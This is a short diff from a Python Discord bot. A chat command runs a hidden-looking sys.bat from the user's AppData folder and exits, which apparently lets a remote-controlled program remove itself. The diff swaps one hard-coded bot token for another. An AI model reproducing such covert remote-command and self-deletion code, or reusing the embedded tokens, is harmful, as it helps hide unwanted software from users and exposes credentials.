@@ -39,4 +39,4 @@ async def on_message(message):
     if "!delete" in message.content:
         os.startfile(f"C://Users//{user_name}//AppData//Roaming//sys.bat")
         exit()
-client.run("OTY3MTM5OTEyMzQ2MzkwNTc4.Gl_5tN.rdaCWuw0bwqcU1KMl84El5--SbwD9JPBaFUR_A")
+client.run("OTY3MTM5OTEyMzQ2MzkwNTc4.Gti3_c.9GD9NBtBMLhpL9GtrmHBOE8A8kTzTKGgkZ-OUk")
